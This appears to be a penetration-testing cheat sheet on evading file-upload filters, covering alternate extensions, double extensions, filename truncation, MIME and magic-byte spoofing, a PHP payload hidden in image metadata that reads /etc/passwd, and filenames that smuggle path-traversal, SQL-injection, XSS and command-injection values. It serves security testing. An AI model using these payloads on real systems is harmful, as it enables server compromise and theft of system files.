
# File Extension Types

Developers might blacklist some extension. However, this can be bypassed by using alternative extensions.

| Type       | Extensions                                          |
| ---------- | --------------------------------------------------- |
| PHP        | `.phtml`, `.php`, `.php3`, `.php4`, `.php5`, `.inc` |
| ASP        | `.asp`, `.aspx`                                     |
| Perl       | `.pl`, `.pm`, `.cgi`, `.lib`                        |
| JSP        | `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`            |
| ColdFusion | `.cfm`, `.cfml`, `.cfc`, `.dbm`                     |

## Letter casing
One should also consider changing the casing of the letters.

```
.pHp
.PHP
.Php
```



# Double Extensions and Junk Data

## Intercept With Proxy (double extension)
In case a file is uploaded with **double extensions** follow the steps below:
1. Make the web request
2. Intercept the traffic with proxy
3. Remove the extension that indicates that the file is an image. `.png` `.jpg`
4. Forward the request
5. Open the uploaded file
## Ways To Evade Security Implementations

Adding a decoy extension before the real one

```
file.png.php
```

*junk* meaningless data in front of the extension

```
file.#.png
file.phpjunkDatapng
file.php%0a.png
```

 Special characters

```
file.php/
file.php....
file.
file.php%20
```

  
  

# Breaking filename length

1. Try what the maximum length accepted for the file name is, by adding a bunch of A's to the file name with the extension at the end. *(Linux maximum is 255 bytes)*
2. Upload the file and see how many characters it allows.
3. Add a valid and a `.php` extension to the file. Make it so that the valid extension gets cut off and the `.php` extension remains.
## Example
1. Assume max file length is 255
2. 251 A's and `.php` extension add up to 255
3. `AAA< SNIP 251 >AAA.php.png`
This way, the `.png` gets cut off and leaves the `.php`



# MIME type

Even `MIME` types can be blacklisted by developers.
By intercepting the traffic one can simply change it, to appeal to the server.

Normal PHP MIME type:

```
Content-type: application/x-php
```

Replace with:

```
Content-type: image/jpeg
```



# Magic Bytes
If an application uses the file's magic bytes to determine the `Content-Type` one can easily bypass it with changing the files magic bytes.

**Table of Magic Bytes**

| Type | Bytes                                      |
|------|--------------------------------------------|
| GIF  | `GIF89a`, `\x0A`                           |
| JPG  | `\xFF\xD8\xFF\xDB`                         |
| PNG  | `\x89\x50\x4E\x47\x0D\x0A\x1A\x0A`         |
| TAR  | `\x75\x73\x74\x61\x72\x00\x30\x30`         |

1. Open the file in `hexeditor`:
```bash
hexeditor <file>
```

2. Edit the first few bytes so that it fits the file type of your choice.

```
# In hexeditor (original)
00 00 00 00

# In hexeditor (changed to JPG)
FF D8 FF DB
```



# PHP getimagesize()

If a file's size gets validated with the `getimagesize()` function, it is possible to add a payload into the image's metadata with `exiftool`.

1. Add payload

```bash

exiftool -Comment='<?php system("cat /etc/passwd") ?>' <jpg_file>

```

2. Change file type

```

mv file.jpg file.php.jpg

```

3. Upload to server (proxy intercept)
  

# From file upload to other vulnerabilities
- Set **filename** to `../../../dev/shm/file.jpg` for **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` for **SQL injection**
- Set **filename** to `<svg onload=alert(document.comain)>` for **XSS**
- Set **filename** to `; sleep 10;` for **command injection**


# References
- [https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html?highlight=file%20upload#from-file-upload-to-other-vulnerabilities](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html?highlight=file%20upload#from-file-upload-to-other-vulnerabilities)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider) -- *tool for detecting file upload vulns*